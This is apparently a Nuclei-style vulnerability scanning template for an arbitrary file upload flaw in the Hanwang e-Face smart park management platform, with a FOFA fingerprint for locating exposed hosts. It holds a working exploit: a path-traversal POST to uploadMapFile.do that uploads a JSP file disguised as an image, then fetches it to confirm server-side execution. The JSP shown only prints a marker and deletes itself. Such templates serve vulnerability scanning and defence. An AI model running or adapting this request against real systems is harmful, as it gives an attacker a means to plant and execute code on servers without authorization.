id: poc-yaml-hw-e-face-pass-spmp-uploadmapfile-do-anyfile-upload
info:
  name: 汉王e脸通智慧园区管理平台 uploadMapFile.do 任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: 文件上传
  metadata:
    finger: e脸通智慧园区管理平台
    fofa: icon_hash="1380907357"

variables:
  t1: "{{rand_base(5)}}"
  t2: "{{base64(t1)}}"

flow: |
  http(1) && http(2)

http:
  - raw:
      - |
        POST /manage/intercom/..%3B/..%3B/manage/visitorMapConfig/uploadMapFile.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
        Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
        Content-Type: image/jpeg

        <%
        out.print("{{t2}}");
        new java.io.File(application.getRealPath(request.getServletPath())).delete();
        %>
        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"success\":true"
    extractors:
      - type: regex
        name: file
        part: body
        internal: true
        regex:
          - "\\\"path\\\":\\\"(?P<file>.*?)\\.jsp"

  - raw:
      - |
        GET /manage/resource/{{file}}.jsp HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
